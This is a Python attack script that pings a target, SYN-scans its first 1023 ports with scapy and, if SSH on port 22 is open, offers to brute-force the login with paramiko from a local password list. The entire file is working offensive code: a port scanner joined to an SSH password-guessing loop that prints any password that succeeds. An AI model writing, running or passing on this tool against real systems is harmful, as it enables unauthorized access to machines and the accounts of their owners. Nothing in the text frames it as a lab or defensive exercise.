from scapy.all import *
import paramiko

target = input("Select target: ")
registred_ports = range(1, 1024)
open_ports = []


def scanport(port):
    source_port = RandShort()
    conf.verb = 0
    pkt = IP(dst=target) / TCP(sport=source_port, dport=port, flags='S')
    synPkt = sr1(pkt, timeout=0.5)
    if not synPkt:
        return False
    elif not pkt.haslayer(TCP):
        return False
    elif synPkt['TCP'].flags == 0x12:
        print("port " + str(port) + " is open")
        sr(IP(dst=target) / TCP(sport=source_port, dport=port, flags='R'), timeout=2)
        return True
    return False


def target_available(target):
    try:
        conf.verb = 0
        ans = sr1(IP(dst=target) / ICMP(), timeout=3)
        if ans:
            return True
        else:
            return False


    except Exception as error:
        print(f"{error} has occured")
        return False


def bruteForce(port):
    with open(r"/home/kali/PasswordList.txt", "r") as passwords:
        user = input("Select login username: ")
        sshConn=paramiko.SSHClient()
        sshConn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for password in passwords:
            try:
                password = password.replace('\n', '')
                sshConn.connect(target, port=int(port), username=user, password=password, timeout=1)
                print("Success. Password: " + str(password))
                sshConn.close()
                break
            except:
                print(password + " failed.")

if target_available(target):
    print(target + " is up.")
    for port in registred_ports:
        status = scanport(port)
        if status:
            open_ports.append(port)
    print("Finished scanning.\n")
    if 22 in open_ports:
        ans = input("Would you like to perform brute-force attack on port 22? Y/n: ")
        if ans in ['y', 'Y']:
            bruteForce(22)
